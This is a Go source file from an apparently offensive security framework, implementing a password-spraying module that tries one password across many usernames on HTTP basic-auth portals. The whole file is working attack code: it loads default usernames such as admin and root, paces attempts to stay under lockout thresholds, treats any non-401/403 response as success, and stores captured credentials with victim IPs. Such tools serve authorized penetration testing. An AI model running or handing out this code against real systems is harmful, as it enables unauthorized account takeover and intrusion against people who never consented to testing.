package auth

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/QYVORA/qyvora-toha3ee/internal/attacks"
	"github.com/QYVORA/qyvora-toha3ee/internal/events"
	"github.com/QYVORA/qyvora-toha3ee/internal/store"
)

// PasswordSpray tests a single candidate password against many usernames and
// hosts, which keeps the attempt-to-lockout ratio low and mirrors the classic
// password-spraying technique used in real engagements against web portals
// protected by HTTP basic auth.
//
// The distinction from brute force matters: brute force hammers one account
// with many passwords (fast lockout), while a spray uses one password across
// many accounts, staying under the account-lockout threshold.
type PasswordSpray struct{}

// Meta implements attacks.Module.
func (*PasswordSpray) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "auth.spray",
		Category:    "auth",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"host"},
		Description: "password spraying: one password across many usernames on HTTP basic-auth portals",
		Limitations: "only tests HTTP basic auth; account-lockout policies and MFA can defeat or detect it; keep spray counts low and paced",
	}
}

// Preflight needs a password and at least one username.
func (*PasswordSpray) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if ctx.Conf.Get("auth.spray", "password") == "" {
		rep.AddFixable("password", "set auth.spray.password to the single password to spray")
	} else {
		rep.AddOK("password", "spray password configured")
	}
	users, err := sprayUsers(ctx)
	if err != nil {
		rep.AddFixable("users", err.Error())
	} else {
		rep.AddOK("users", fmt.Sprintf("%d username(s) loaded", len(users)))
	}
	found := false
	for _, h := range ctx.Store.Hosts() {
		if webPort(h) > 0 {
			found = true
			break
		}
	}
	if !found {
		rep.AddFixable("targets", "no web-enabled hosts; run service.synscan first")
	} else {
		rep.AddOK("targets", "web-enabled host(s) available")
	}
	return rep, nil
}

// Run sprays the password against each host's web port.
func (*PasswordSpray) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	password := ctx.Conf.Get("auth.spray", "password")
	// An explicit invocation option overrides the configured password — this
	// is how the REPL allows one-off sprays without touching config.
	if o, ok := opts["password"]; ok && o != "" {
		password = o
	}
	users, err := sprayUsers(ctx)
	if err != nil {
		return fmt.Errorf("auth.spray: %w", err)
	}
	timeout := ctx.Conf.GetDuration("auth.spray", "timeout", 3*time.Second)
	delay := ctx.Conf.GetDuration("auth.spray", "delay", 500*time.Millisecond)
	client := &http.Client{Timeout: timeout, CheckRedirect: func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	}}

	targets := credTargets(ctx, "auth.spray")
	if len(targets) == 0 {
		return fmt.Errorf("auth.spray: no web-enabled hosts; run service.synscan first")
	}

	found := 0
	attempts := 0
	for _, t := range targets {
		scheme := "http"
		if t.port == 443 || t.port == 8443 {
			scheme = "https"
		}
		base := fmt.Sprintf("%s://%s", scheme, net.JoinHostPort(t.host.IP.String(), strconv.Itoa(int(t.port))))
		for _, user := range users {
			// Cooperative shutdown: bail out between attempts, not mid-flight.
			select {
			case <-ctx.Done:
				return nil
			default:
			}
			req, err := http.NewRequest("GET", base+"/", nil)
			if err != nil {
				continue
			}
			req.SetBasicAuth(user, password)
			req.Header.Set("User-Agent", "toha3ee/1.0")
			resp, err := client.Do(req)
			if err != nil {
				break // host unreachable or closed the connection
			}
			attempts++
			if resp.Body != nil {
				_ = resp.Body.Close()
			}
			// 401/403 means the credential was refused. Anything else with a
			// valid basic-auth header is treated as accepted.
			if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
				time.Sleep(delay)
				continue
			}
			found++
			ctx.Store.AddCred(store.Cred{
				Service:  "http.basic",
				Username: user,
				Password: password,
				Host:     t.host.IP.String(),
				VictimIP: t.host.IP.String(),
				Source:   "auth.spray",
				Time:     time.Now(),
			})
			ctx.Emit(events.TopicCredFound, fmt.Sprintf("auth.spray: %s accepted %s:%s", t.host.IP, user, password), nil)
			ctx.Printf("[+] auth.spray: %s %s:%s\n", t.host.IP, user, password)
		}
	}
	ctx.SetState("auth.spray", found)
	ctx.Printf("[*] auth.spray complete: %d/%d attempt(s) found a valid credential.\n", found, attempts)
	return nil
}

// sprayUsers loads the username list: the auth.spray.users knob, a wordlist
// file via auth.spray.wordlist, or the documented default list. The fallback
// chain keeps the module usable with zero configuration for quick smoke tests.
func sprayUsers(ctx *attacks.AttackCtx) ([]string, error) {
	if raw := ctx.Conf.Get("auth.spray", "users"); strings.TrimSpace(raw) != "" {
		var out []string
		for _, u := range strings.Split(raw, ",") {
			if u = strings.TrimSpace(u); u != "" {
				out = append(out, u)
			}
		}
		if len(out) > 0 {
			return out, nil
		}
	}
	if f := ctx.Conf.Get("auth.spray", "wordlist"); f != "" {
		lines, err := readLines(f)
		if err != nil {
			return nil, err
		}
		if len(lines) == 0 {
			return nil, fmt.Errorf("wordlist %s has no lines", f)
		}
		return lines, nil
	}
	return []string{"admin", "root", "user", "administrator", "test"}, nil
}

// readLines reads non-empty, trimmed lines from a file. The scanner buffer is
// bumped so very long lines in a wordlist do not trip the 64KiB default limit.
func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer func() { _ = f.Close() }()
	var out []string
	sc := bufio.NewScanner(f)
	// 64KiB start, up to 1MiB max token length.
	sc.Buffer(make([]byte, 64*1024), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			out = append(out, line)
		}
	}
	// sc.Err() surfaces read errors; scan stops on EOF with a nil error.
	return out, sc.Err()
}

// Verify reports the credentials found.
func (*PasswordSpray) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("auth.spray")
	if !ok {
		return nil, fmt.Errorf("auth.spray not run")
	}
	n, _ := v.(int)
	imp := &attacks.Impact{Summary: fmt.Sprintf("%d valid credential(s) found by password spray", n)}
	for _, c := range ctx.Store.CredsBySource("auth.spray") {
		imp.Add("cred", c.Host+" "+c.Username+":"+c.Password)
	}
	return imp, nil
}

// Cleanup is a no-op.
func (*PasswordSpray) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// Compile-time assertion that PasswordSpray satisfies the Module contract.
var _ attacks.Module = (*PasswordSpray)(nil)
